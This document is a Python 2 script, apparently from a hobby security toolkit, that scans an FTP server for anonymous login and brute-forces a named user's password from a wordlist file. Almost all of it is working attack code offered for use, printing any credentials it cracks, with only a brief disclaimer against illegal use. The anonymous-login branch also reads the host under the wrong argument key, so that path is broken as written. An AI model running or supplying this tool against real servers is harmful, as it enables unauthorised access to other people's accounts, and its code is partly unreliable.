#!./env/bin/python

""" FTP Scanner/Brute Forcer

    Use this to either scan a host for anonymous FTP logins or
    to try a password list against a host.

    Don't be a moron, please don't use this for something illegal.

    Usage:
        ftp.py brute [-v] <host> <user> <password_file>
        ftp.py anon [-v] <host>
        ftp.py -h | --help
        ftp.py --version

    Options:
        -v              verbose
        -h --help       Show this screen.
        --version       Show version

    Examples:
        ./ftp.py anon ftp.debian.org
        ./ftp.py brute localhost root wordlist/general/big.txt
        ./ftp.py brute -v localhost root wordlist/general/common.txt
"""

import ftplib
from docopt import docopt
from colorama import Fore, init


def brute_login(hostname, user_name, password_file, verbose=False):
    fp = open(password_file, 'r')

    for line in fp.readlines():
        password = line.strip('\r').strip('\n')

        if verbose:
            print "[+] Trying: " + user_name + "/" + password

        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user_name, password)
            ftp.quit()

            return (user_name, password)
        except Exception:
            pass

    return False


def anon_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        ftp.quit()

        return True
    except Exception:
        return False


def main(arguments):
    if arguments['anon']:
        anon = anon_login(arguments['host'])

        if anon:
            print Fore.GREEN + '[*] ' + str(arguments['host']) + ' FTP Anonymous Logon Succeeded.' + Fore.RESET
        else:
            print Fore.RED + '[-] ' + str(arguments['host']) + ' FTP Anonymous Logon Failed.' + Fore.RESET
    elif arguments['brute']:
        if arguments['-v']:
            credentials = brute_login(arguments['<host>'], arguments['<user>'], arguments['<password_file>'], verbose=True)
        else:
            credentials = brute_login(arguments['<host>'], arguments['<user>'], arguments['<password_file>'])

        if credentials:
            print Fore.GREEN + '[*] FTP Logon Succeeded: ' + credentials[0] + ":" + credentials[1] + Fore.RESET
        else:
            print Fore.RED + '[-] No password found for that user on the FTP server.' + Fore.RESET


if __name__ == '__main__':
    init()
    arguments = docopt(__doc__, version="0.1")
    main(arguments)
